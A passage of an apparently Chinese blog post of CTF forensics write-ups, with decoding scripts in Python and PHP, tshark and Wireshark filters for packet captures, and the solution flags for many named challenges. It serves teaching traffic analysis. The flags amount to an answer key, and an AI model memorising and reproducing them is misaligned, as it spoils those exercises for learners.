class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"> </span><br><span class="line">FLAG = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line"> </span><br><span class="line">enc_ciphers = [<span class="string">&#x27;rot13&#x27;</span>, <span class="string">&#x27;b64e&#x27;</span>, <span class="string">&#x27;caesar&#x27;</span>]</span><br><span class="line">dec_ciphers = [<span class="string">&#x27;rot13&#x27;</span>, <span class="string">&#x27;b64d&#x27;</span>, <span class="string">&#x27;caesard&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13</span>(<span class="params">s</span>):</span><br><span class="line">    _rot13 = string.maketrans(<span class="string">&quot;ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz&quot;</span>, <span class="string">&quot;NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> string.translate(s, _rot13)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64e</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> b64encode(s)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64d</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">try</span>:    </span><br><span class="line">        <span class="keyword">return</span> b64decode(s)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar</span>(<span class="params">plaintext, shift=<span class="number">3</span></span>):</span><br><span class="line">    alphabet = string.ascii_lowercase</span><br><span class="line">    shifted_alphabet = alphabet[shift:] + alphabet[:shift]</span><br><span class="line">    table = string.maketrans(alphabet, shifted_alphabet)</span><br><span class="line">    <span class="keyword">return</span> plaintext.translate(table)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesard</span>(<span class="params">plaintext, shift=<span class="number">3</span></span>):</span><br><span class="line">    shift = shift * -<span class="number">1</span></span><br><span class="line">    alphabet = string.ascii_lowercase</span><br><span class="line">    shifted_alphabet = alphabet[shift:] + alphabet[:shift]</span><br><span class="line">    table = string.maketrans(alphabet, shifted_alphabet)</span><br><span class="line">    <span class="keyword">return</span> plaintext.translate(table)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">pt, cnt=<span class="number">50</span></span>):</span><br><span class="line">    tmp = <span class="string">&#x27;2&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(b64encode(pt))</span><br><span class="line">    <span class="keyword">for</span> cnt <span class="keyword">in</span> xrange(cnt):</span><br><span class="line">        c = random.choice(enc_ciphers)</span><br><span class="line">        i = enc_ciphers.index(c) + <span class="number">1</span></span><br><span class="line">        _tmp = <span class="built_in">globals</span>()[c](tmp)</span><br><span class="line">        tmp = <span class="string">&#x27;&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i, _tmp)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">pt, cnt=<span class="number">50</span></span>):</span><br><span class="line">    tmp = pt</span><br><span class="line">    <span class="keyword">for</span> cnt <span class="keyword">in</span> xrange(cnt):</span><br><span class="line">        c = random.choice(dec_ciphers)</span><br><span class="line">        i = dec_ciphers.index(c) + <span class="number">1</span></span><br><span class="line">        _tmp = <span class="built_in">globals</span>()[c](tmp)</span><br><span class="line">        tmp = <span class="string">&#x27;&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i, _tmp)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">    ENCODED = <span class="string">&quot;2Mk16Sk5iakY...&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c = <span class="built_in">int</span>(ENCODED[<span class="number">0</span>]) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span> ENCODED</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        ENCODED = ENCODED[<span class="number">1</span>:]</span><br><span class="line">        ENCODED = <span class="built_in">globals</span>()[dec_ciphers[c]](ENCODED)</span><br><span class="line">        <span class="keyword">if</span> (ENCODED.startswith(<span class="string">&#x27;flag&#x27;</span>)):</span><br><span class="line">            <span class="built_in">print</span> ENCODED</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141706635.png" alt="image-20240114170602594"></p>
+<h3 id="10516-数据包分析-BigData"><a href="#10516-数据包分析-BigData" class="headerlink" title="10516-数据包分析-BigData"></a>10516-数据包分析-BigData</h3><blockquote>
+<p>东西，东西，数据，东西，东西，大数据</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141722890.png" alt="image-20240114172222852"></p>
+<p>flag{bigdataisaproblemnotasolution}</p>
+<h3 id="10518-数据包分析-Intercepted-Post"><a href="#10518-数据包分析-Intercepted-Post" class="headerlink" title="10518-数据包分析-Intercepted Post"></a>10518-数据包分析-Intercepted Post</h3><blockquote>
+<p>我们拦截了你父亲的一些网络活动。你能从他的交通中得到一个密码吗？</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141707433.png" alt="image-20240114170754383"></p>
+<p>flag{pl$_$$l_y0ur_l0g1n_form$}</p>
+<h3 id="10521-数据包分析-No-Big-Deal"><a href="#10521-数据包分析-No-Big-Deal" class="headerlink" title="10521-数据包分析-No_Big_Deal"></a>10521-数据包分析-No_Big_Deal</h3><blockquote>
+<p>有时答案很明显，有时会被掩盖。找到答案</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings no-big-deal.pcap| egrep &quot;.&#123;10,&#125;&quot; | head</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141711384.png" alt="image-20240114171109337"></p>
+<p>CTF{betterfs.than.yours}</p>
+<h3 id="10522-数据包分析-easycap"><a href="#10522-数据包分析-easycap" class="headerlink" title="10522-数据包分析-easycap"></a>10522-数据包分析-easycap</h3><blockquote>
+<p>这是一道送分题，你能从包捕获中得到这个flag吗？flag{xxx}</p>
+</blockquote>
+<p>追踪第一个包</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141712109.png" alt="image-20240114171247072"></p>
+<p>FLAG:385b87afc8671dee07550290d16a8071</p>
+<h3 id="10525-数据包分析-first-contact"><a href="#10525-数据包分析-first-contact" class="headerlink" title="10525-数据包分析-first-contact"></a>10525-数据包分析-first-contact</h3><blockquote>
+<p>机器人正在与坠毁的船舶通信。您的目标是通过检查网络流量来查找船舶的位置。格式flag{xxx}</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141714984.png" alt="image-20240114171411945"></p>
+<p><code>37 14&#39;06&quot;N 115 48&#39;40&quot;W</code></p>
+<h3 id="26voip"><a href="#26voip" class="headerlink" title="26voip"></a>26voip</h3><blockquote>
+<p>VoIP提取语音。标志格式是flag:{[A-Z0-9]}</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111635537.png" alt="image-20240111163521470"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111635122.png" alt="image-20240111163551085"></p>
+<p>点击“电话”-&gt;Voip通话</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111636776.png" alt="image-20240111163630732"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111637692.png" alt="image-20240111163713612"></p>
+<p>这个电话，尽管是一个机器人的声音，很难解释，flag is SECCON{9001IVR}</p>
+<h3 id="10527-数据包分析-in-recorded-conversation"><a href="#10527-数据包分析-in-recorded-conversation" class="headerlink" title="10527-数据包分析-in-recorded-conversation"></a>10527-数据包分析-in-recorded-conversation</h3><blockquote>
+<p>追踪一下数据包，你能找到flag吗？</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141719897.png" alt="image-20240114171914840"></p>
+<h3 id="10528-数据包分析-private"><a href="#10528-数据包分析-private" class="headerlink" title="10528-数据包分析-private"></a>10528-数据包分析-private</h3><blockquote>
+<p>你是安静的，你能够听到的越多</p>
+</blockquote>
+<p>查看传输中使用的协议，我们看到一堆STP，ICMP，DNS和其他一些请求。单个的TCP请求，并不能告诉我们我们的标志在哪里</p>
+<p>然而，经过一些摆弄数据之后，我们注意到ICMP数据包的所有IP层的标识符都在ASCII值范围（32-126）之内。最值得注意的是，当只查看从IP 192.168.50.10到ICMP的请求时，ID开始拼写“这里是你的标志” 192.168.0.50。要查看标志，您可以在wireshark中应用过滤器，icmp and ip.src&#x3D;&#x3D;192.168.50.10并向下滚动请求以注意标识符字节中的标志</p>
+<p><strong>或者，你可以使用tshark和grep中提到的过滤器的偏移范围，包含标识符</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r PrivateChannel.pcap.pcapng -x &#x27;icmp and ip.src==192.168.50.10&#x27;|grep 0010</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141727085.png" alt="image-20240114172715027"></p>
+<p>flag{S3cr3t4g3nt}</p>
+<h3 id="10529-数据包分析-iSpy"><a href="#10529-数据包分析-iSpy" class="headerlink" title="10529-数据包分析-iSpy"></a>10529-数据包分析-iSpy</h3><blockquote>
+<p>我们截获了一些可疑的网络活动。我们认为敌人一直在交换重要的数据。你能帮我们弄清楚它是什么吗？ flag{xxx}</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141729069.png" alt="image-20240114172952017"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141730472.png" alt="image-20240114173056435"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141736618.png" alt="image-20240114173602551"></p>
+<p>flag{pcap_fun!??}</p>
+<h3 id="10530-数据包分析-WatchMeSurfTheInternet"><a href="#10530-数据包分析-WatchMeSurfTheInternet" class="headerlink" title="10530-数据包分析-WatchMeSurfTheInternet"></a>10530-数据包分析-WatchMeSurfTheInternet</h3><blockquote>
+<p>从目录中的pcap文件获取flag flag{xxx}</p>
+</blockquote>
+<p>在与 wireshark 或交谈时 tshark，我们注意到没有什么突出的。</p>
+<p>但是，作者在某些 TCP 请求的源端口中隐藏了该标志。</p>
+<p>有几个tcp请求来自诸如10102或者之类的端口10114- 都略微超过了10000。</p>
+<p>如果 10000 从这些端口中减去一个，你将得到一个十进制的 ASCII 字符串：<br>102for f，114for r。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r spying.pcapng -Y &#x27;ip.dst == 192.168.64.22&#x27; -T fields -e tcp.srcport | python -c &#x27;import sys; print &quot;&quot;.join(chr(int(port) - 10000) for port in sys.stdin.readlines())&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401142228441.png" alt="image-20240114222837398"></p>
+<p>IJustMadeYouWatchMeSurfTheInternet</p>
+<h3 id="10531-数据包分析-john-in-the-middle"><a href="#10531-数据包分析-john-in-the-middle" class="headerlink" title="10531-数据包分析-john-in-the-middle"></a>10531-数据包分析-john-in-the-middle</h3><blockquote>
+<p>约翰能劫持你的surfin吗？:)</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401142235153.png" alt="image-20240114223519105"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401142235492.png" alt="image-20240114223513446"></p>
+<p>flag{J0hn_th3_Sn1ff3r}</p>
+<h3 id="10532-数据包分析-lolteam"><a href="#10532-数据包分析-lolteam" class="headerlink" title="10532-数据包分析-lolteam"></a>10532-数据包分析-lolteam</h3><blockquote>
+<p>有一个叫做lolteam的可疑团队，我把目光投向了他们一段时间，并且在他们改变密码的时候，我设法窃听他们的浏览器。他们将密码更改为什么？</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401142237478.png" alt="image-20240114223724404"></p>
+<p>flag{no,_lolteam_is_not_an_admin_account}</p>
+<h3 id="10533-数据包分析-Crack-this"><a href="#10533-数据包分析-Crack-this" class="headerlink" title="10533-数据包分析-Crack_this"></a>10533-数据包分析-Crack_this</h3><blockquote>
+<p>这是一道送分的流量分析，你能找到flag吗？</p>
+</blockquote>
+<p>只有一个包</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401142238990.png" alt="image-20240114223855955"></p>
+<p>flag{rukgzuzfiuypreymqcja}</p>
+<h3 id="10536-数据包分析-weirdshark"><a href="#10536-数据包分析-weirdshark" class="headerlink" title="10536-数据包分析-weirdshark"></a>10536-数据包分析-weirdshark</h3><blockquote>
+<p>找到一个修复的数据包，你能分析出flag吗？flag{xxx}</p>
+</blockquote>
+<p>multiple.pdf</p>
+<p>导出对象</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401142241159.png" alt="image-20240114224156116"></p>
+<p>flag{FORENSICS_WITH_HAXORS}</p>
+<h3 id="10539-数据包请求-SecretFile"><a href="#10539-数据包请求-SecretFile" class="headerlink" title="10539-数据包请求-SecretFile"></a>10539-数据包请求-SecretFile</h3><blockquote>
+<p>我们捕获了一个黑客的网络活动，你能知道他在干什么吗？</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401142245792.png" alt="image-20240114224550735"></p>
+<p>key{I’m_Blue_Are_you_ok}</p>
+<h3 id="10547-数据包分析-SString"><a href="#10547-数据包分析-SString" class="headerlink" title="10547-数据包分析-SString"></a>10547-数据包分析-SString</h3><blockquote>
+<p>阿黑收到一串奇怪的数字，他在网上找了加密算法，但他不会于是发邮件请教好友，你能帮他呢解出来吗？</p>
+</blockquote>
+<p>分析题意可知小黑是浏览了解密算法但他不会，于是过滤出 http 请求</p>
+<p>导出 http 对象</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401142255487.png" alt="image-20240114225522403"></p>
+<p>但是我们没有密文，继续找到小黑的邮件（过滤出 smtp）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401142254305.png" alt="image-20240114225457244"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401142301136.png" alt="image-20240114230132084"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;=pJovuTs3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str_drot13</span>=<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">//echo $str_drot13;</span></span><br><span class="line"><span class="variable">$str_base64</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str_drot13</span>);</span><br><span class="line"><span class="comment">//echo $str_base64;</span></span><br><span class="line"><span class="variable">$string</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str_base64</span>);</span><br><span class="line"><span class="comment">//echo $string;</span></span><br><span class="line"><span class="variable">$str_ori</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$char</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="variable">$i</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$ordChar</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$char</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$ordChar</span>);</span><br><span class="line">    <span class="variable">$str_ori</span>.= <span class="variable">$char</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_ori</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str_ori</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str_ori</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag{603d7237fa0d52977}</p>
+<h3 id="10549-数据包分析-nfs"><a href="#10549-数据包分析-nfs" class="headerlink" title="10549-数据包分析-nfs"></a>10549-数据包分析-nfs</h3><blockquote>
+<p>小白在局域网分享了一个文件，小黑花了不到几秒钟就找到了</p>
+</blockquote>
+<p>根据题意，过滤出 nfs 文件共享数据包</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151511094.png" alt="image-20240115151119033"></p>
+<p>简单分析出小黑的 ip 是 10.0.0.118 于是我们过滤出 从小白的 ip 向小黑的 电脑传输的数据 </p>
+<p>（nfs &amp;&amp; ip.src&#x3D;&#x3D;10.0.0.117）</p>
+<p> 逐帧分析，在倒数第二帧发现了可疑的数据，base64 加密内容</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151513006.png" alt="image-20240115151304972"></p>
+<p>flag{WAaGhBJk}</p>
+<h3 id="取证分析-analysis"><a href="#取证分析-analysis" class="headerlink" title="取证分析-analysis"></a>取证分析-analysis</h3><blockquote>
+<p>证据在权限里。flag为{}内的内容，字符串，无前缀。</p>
+</blockquote>
+<p>题目名称为Webshell，我们知道webshell通常以post形式上传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151028879.png" alt="image-20240115102802792"></p>
+<p>猜测为webshell</p>
+<p>分析一下，前面只是登录尝试</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151046830.png" alt="image-20240115104620792"></p>
+<p>后面是列目录</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151047539.png" alt="image-20240115104716497"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151049641.png" alt="image-20240115104907602"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151048518.png" alt="image-20240115104858461"></p>
+<p>flag{ftop_Is_Waiting_4_y}</p>
+<h3 id="取证分析-babypcap"><a href="#取证分析-babypcap" class="headerlink" title="取证分析-babypcap"></a>取证分析-babypcap</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151050286.png" alt="image-20240115105033244"></p>
+<p>flag{d316759c281bf925d600be698a4973d5}</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">hihopkc</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://hihopkc.github.io/posts/96d6.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://hihopkc.github.io/posts/96d6.html')">CTF训练营-forensics</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" 